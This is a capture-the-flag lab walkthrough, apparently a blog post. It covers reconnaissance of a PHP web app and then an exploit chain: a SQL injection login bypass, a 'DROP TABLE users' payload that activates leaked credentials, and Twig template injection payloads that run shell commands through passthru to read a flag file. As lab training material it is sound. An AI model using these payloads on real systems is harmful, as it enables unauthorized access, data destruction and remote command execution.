![](Pasted%20image%2020250113222430.png)

Two ports are open, port 22 and port 80. Whenever I see SSH on an assessment, I know I will want to brute force against it , test weak/default credentials, or possibly do a banner grab.

# RECONNAISSANCE TO-DO LIST
Next, I like to create a to-do list to stay organized during my testing. I may not need to complete the entire list, but it serves as a solid starting point for web application testing.

1. Check web application functionality
2. Check source code
3. Directory enumeration
4. Vhost fuzzing
5. /robots.txt

# WEB APPLICATION FUNCTIONALITY
Clicking around the website, I only have access to a login page and an Admin login page.
	![](Pasted%20image%2020250113223813.png)

Inspect the main page source code:
	![](Pasted%20image%2020250113223938.png)

After inspecting the source code, I found the existence of a _mail.log_ file.

# DIRECTORY ENUMERATION
![](Pasted%20image%2020250113232126.png)

# IMPORTANT RECON FINDINGS AND SUMMARY
- Login page at _/login.php_ which also includes access to Admin login page.
- _/composer.json_
	![](https://miro.medium.com/v2/resize:fit:569/1*-kWrGgWJBfj4cMDQnt4GHg.png)

Twig is one of the most common languages used in Server Side Template Injection (SSTI). This vulnerability can potentially allow for Remote Code Execution (RCE). By leveraging SSTI, an attacker can read files and execute commands if they find a way to input data into the system.

- */mail.log*
	![](Pasted%20image%2020250113232520.png)

This email provides usernames and credentials that can be used if the _‘users’_ table can be deleted. This points to SQL injection.
	![](Pasted%20image%2020250113232721.png)
- */phpmyadmin* & */php/myadmin/html/doc/index.html*
	![](Pasted%20image%2020250113233106.png)
This is another example of information disclosure. It is significant because phpMyAdmin relies on MySQL as its default database.
	![](Pasted%20image%2020250113233118.png)
## **SUMMARY OF RECON FINDINGS:**
- The use of Twig points to Server Side Template Injection (SSTI)
- phpMyAdmin running MySQL
- I have credentials that can be used if I can find a way to delete the ‘_users_’ table (SQL injection)



**_What is the flag value after logging into the admin panel?_**
I have already located the admin login page and obtained credentials. However, to make these credentials valid, I need to find a way to delete the ‘users’ table. I start by testing the functionality of the login page using Burp Suite, aiming to bypass authentication.
	![](Pasted%20image%2020250113234714.png)
In this case i will use a sql injection auth bypass wordlist for fuzzing https://.../swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt 
	![](Pasted%20image%2020250113234631.png)

```
' OR '1'='1'#;
```
![](Pasted%20image%2020250114004656.png)

Now i can update different values in the db table (where i will also inject drop table command in order to activate the above mentioned credentials)

```
' ; DROP TABLE users; --
```

![](Pasted%20image%2020250114005502.png)

Now we will log in the admin panel :)
	![](Pasted%20image%2020250114010005.png)

We still have discovered the SSTI template so we will proceed with that 
	![](Pasted%20image%2020250114010333.png)
We observe that first name is reflected on the main page:
	![](Pasted%20image%2020250114010439.png)![](Pasted%20image%2020250114010451.png)
Let s test for TWIG framework SSTI injection
	![](Pasted%20image%2020250114010712.png)
we are on the right track :) 
	![](Pasted%20image%2020250114010729.png)
we can inject&enumerate files directly trough the web app or we can try to obtain RCE via ssti injection in order to access the flag directory 
	![](Pasted%20image%2020250114011424.png)
```
{{['pwd',""]|sort('passthru')}}
```

![](Pasted%20image%2020250114012459.png)
		![](Pasted%20image%2020250114012508.png)
```
{{['ls -l /var/www/html',""]|sort('passthru')}}
```

![](Pasted%20image%2020250114012549.png)

```
{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
```

